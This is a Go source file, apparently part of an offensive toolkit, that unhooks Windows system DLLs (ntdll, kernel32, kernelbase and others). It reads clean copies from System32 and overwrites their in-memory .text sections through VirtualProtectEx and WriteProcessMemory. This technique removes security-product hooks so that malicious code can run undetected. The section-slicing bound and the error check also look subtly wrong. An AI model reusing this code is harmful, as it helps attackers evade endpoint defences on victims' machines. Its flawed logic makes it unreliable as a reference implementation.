package classic

import (
	"debug/pe"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var systemPath string
var kernel32 = syscall.NewLazyDLL("kernel32.dll")
var writeProcessMemory = kernel32.NewProc("WriteProcessMemory")

func getSystemPath() string {
	path := os.Getenv("SystemRoot")
	if path == "" {
		return ""
	}

	path = filepath.Join(path, "System32")
	return path + "\\"
}

func getFreshDllClassic(dll string) error {
	bytes, err := os.ReadFile(dll)
	if err != nil {
		return err
	}

	file, err := pe.Open(dll)
	if err != nil {
		return err
	}

	textSection := file.Section(".text")
	interestingBytes := bytes[textSection.Offset:textSection.Size]
	return writeFreshDataClassic(interestingBytes, dll, textSection.VirtualAddress)
}

func writeFreshDataClassic(bytes []byte, dllName string, virtualOffset uint32) error {
	dll, err := syscall.LoadDLL(dllName)
	if err != nil {
		return err
	}
	defer dll.Release()

	dllHandle := dll.Handle
	dllBase := uintptr(dllHandle)
	dllOffset := uint(dllBase) + uint(virtualOffset)

	var old uint32
	sizet := len(bytes)
	hProcess := windows.CurrentProcess()

	err = windows.VirtualProtectEx(hProcess,
		uintptr(dllOffset),
		uintptr(sizet),
		windows.PAGE_EXECUTE_READWRITE,
		&old)

	if err != nil {
		return err
	}

	_, _, err = writeProcessMemory.Call(
		uintptr(hProcess),
		uintptr(dllOffset),
		uintptr(unsafe.Pointer(&bytes[0])),
		uintptr(len(bytes)),
		0)

	if err != windows.SEVERITY_SUCCESS {
		return err
	}

	return nil
}

func UnhookDllClassic() {
	dll_list := []string{"kernel32.dll", "kernelbase.dll", "ntdll.dll", "user32.dll", "apphelp.dll", "msvcrt.dll"}
	systemPath = getSystemPath()

	for _, dll := range dll_list {
		getFreshDllClassic(systemPath + dll)
	}
}
